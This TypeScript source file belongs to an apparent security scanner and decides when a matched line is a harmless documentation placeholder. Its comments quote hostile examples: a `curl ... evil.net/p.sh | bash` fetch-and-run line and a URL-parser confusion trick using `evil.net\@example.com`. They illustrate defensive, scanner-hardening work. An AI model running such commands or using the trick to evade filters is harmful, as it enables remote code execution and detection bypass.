/**
 * Placeholder detection for rules that opt in with `skipPlaceholderLines`.
 *
 * Documentation is full of lines like `curl https://api.example.com/x | bash` or
 * `export TOKEN=YOUR_API_KEY`. Reporting them is noise, so a rule may skip a match
 * that is clearly a placeholder.
 *
 * The check must not be something an attacker can switch on. The earlier version
 * skipped the whole line when a word such as "example", "sample" or "1234" appeared
 * ANYWHERE on it, so `curl http://evil.net/p.sh | bash # example` was treated as
 * documentation. Anything a line can say to look harmless, a payload can say too.
 * So the rules here are about what the match actually does:
 *
 *   1. Only the matched text counts, extended to the end of the token the match
 *      stopped in. Words elsewhere on the line (a trailing comment, an unrelated
 *      argument, a second command) never excuse it.
 *   2. If the match contains a URL, the HOST decides. Every URL host must be a
 *      reserved example host (example.com/.org/.net/.edu, `.example`, `.invalid`)
 *      or a bracketed template (`<your-host>`, `{{host}}`). A placeholder word in
 *      the path, the query string or any other argument is ignored, and one real
 *      host in the match is enough to report it.
 *   3. If the match reads a live value (`$TOKEN`, `${KEY}`, `$(cat f)`, backticks,
 *      `process.env`, `os.environ`, `getenv`) and has no URL, it is never a
 *      placeholder: a dummy word beside a real secret does not make it safe.
 *   4. Only when none of that applies does a placeholder word in the match count.
 */

/**
 * Placeholder words from gitleaks, TruffleHog and GitLab secret-scanner allowlists.
 * Criteria: virtually never appear in live attack code, documented false-positive
 * history, and no generic words such as "test".
 *
 * These are the only terms a HOST may be excused by. Digit runs are deliberately
 * not in this list: `1234567890` and `0000` are valid IPv4 integers (73.150.2.210
 * and 0.0.0.0), so a host made of digits is an address, never a placeholder.
 */
const WORD_TERMS: readonly RegExp[] = [
  /\bexample\b/i,
  /\bplaceholder\b/i,
  /\bdummy\b/i,
  /\bfake\b/i,
  /\bchangeme\b/i,
  /\byour[_-]?(?:token|key|secret|password|api[_-]?key)\b/i,
  /<(?:your[_-]?)?(?:token|key|secret|password|api[_-]?key)>/i,
  /\bREPLACE(?:_WITH|_ME|_THIS)?\b/,
  /xxxx+/i,
  /\bsample\b/i,
];

/** Digit-run fillers (`0000`, `1234`). Fine inside a secret value, never in a host. */
const DIGIT_TERMS: readonly RegExp[] = [/0000+/, /1234(?:56)?/];

const PLACEHOLDER_TERMS: readonly RegExp[] = [...WORD_TERMS, ...DIGIT_TERMS];

// A host written as one decimal, octal or hex integer is an IPv4 address (curl,
// browsers and inet_aton all accept it): http://2130706433/ is http://127.0.0.1/.
const INTEGER_HOST = /^(?:0x[0-9a-f]+|[0-9]+)$/i;

// Characters that different URL parsers read differently inside an authority:
// a backslash (WHATWG treats it as "/", curl does not), percent-escapes, control
// characters, whitespace and anything outside ASCII (IDNA mapping differs).
// `http://evil.net\@example.com/` is example.com to one parser and evil.net to
// another, so an authority with any of these is never excused.
// eslint-disable-next-line no-control-regex
const AMBIGUOUS_AUTHORITY = /[\\%\s\u0000-\u001f\u007f-\uffff]/;

// "scheme://authority": the authority is a bracketed template or everything up to
// the next delimiter. Userinfo and port are still inside it; hostOf() removes them.
const URL_AUTHORITY = /\b[a-z][a-z0-9+.-]*:\/\/(<[^<>\s]*>|\{\{[^{}\s]*\}\}|[^\s/?#"'`)\]|;&<>]*)/gi;

// A value read at run time: shell/JS/Python/Ruby/PowerShell variables and substitutions.
// A backtick counts only as a pair (command substitution); a lone one is Markdown code.
const LIVE_VALUE =
  /\$\{|\$\(|\$[A-Za-z_]|`[^`]*`|%[A-Za-z_][A-Za-z0-9_]*%|\bprocess\.env\b|\bos\.environ\b|\bos\.getenv\b|\bgetenv\b|\bENV\[|\$env:/;

/** The host part of a URL authority: no userinfo, no port, lower case, no trailing dot. */
function hostOf(authority: string): string {
  const at = authority.lastIndexOf("@");
  const afterUser = at >= 0 ? authority.slice(at + 1) : authority;
  const noPort = afterUser.replace(/:\d*$/, "");
  return noPort.toLowerCase().replace(/\.$/, "");
}

/**
 * True when a URL authority (`user:pw@host:port`) can only ever point at a reserved
 * documentation host. An authority that parsers could read two ways is rejected
 * before its host is even looked at, so a trick like `evil.net\@example.com` fails
 * closed instead of depending on which parser the victim happens to run.
 */
function isPlaceholderAuthority(authority: string): boolean {
  if (AMBIGUOUS_AUTHORITY.test(authority)) return false;
  return isPlaceholderHost(hostOf(authority));
}

/**
 * True for hosts that cannot belong to an attacker: the names reserved for
 * documentation by RFC 2606 / RFC 6761, and bracketed templates, which cannot be
 * resolved at all. A real domain that merely contains "example" (my-example.com,
 * example.evil.net) is NOT a placeholder: anyone can register it.
 */
export function isPlaceholderHost(host: string): boolean {
  if (/^(?:<[^<>]+>|\{\{[^{}]+\}\})$/.test(host)) return true;
  const labels = host.split(".");
  const tld = labels[labels.length - 1] ?? "";
  if (tld === "example" || tld === "invalid") return true;
  // A single label (fake-host, placeholder) is not a registrable public domain, so
  // nobody outside this machine's own DNS configuration can own it. An integer
  // (1234567890, 0000, 0x7f000001) is an IPv4 address in disguise and never qualifies.
  if (labels.length === 1) {
    if (INTEGER_HOST.test(host)) return false;
    return WORD_TERMS.some((term) => term.test(host));
  }
  if (tld === "com" || tld === "org" || tld === "net" || tld === "edu") {
    return labels[labels.length - 2] === "example";
  }
  return false;
}

/**
 * True when the text matched by a rule is almost certainly a documentation example.
 *
 * @param text   the line (or merged multi-line window) that was scanned
 * @param index  where the rule's match starts in `text`
 * @param length how long the match is
 */
export function isPlaceholderMatch(text: string, index: number, length: number): boolean {
  // The match, extended to the end of the token it stopped in: rules such as EX-002
  // end on `http`, and the URL they refer to continues right after it.
  let end = index + length;
  while (end < text.length && !/\s/.test(text.charAt(end))) end++;
  const region = text.slice(index, end);

  const authorities = [...region.matchAll(URL_AUTHORITY)].map((m) => m[1] ?? "");
  if (authorities.length > 0) {
    return authorities.every(isPlaceholderAuthority);
  }

  if (LIVE_VALUE.test(region)) return false;
  return PLACEHOLDER_TERMS.some((term) => term.test(region));
}
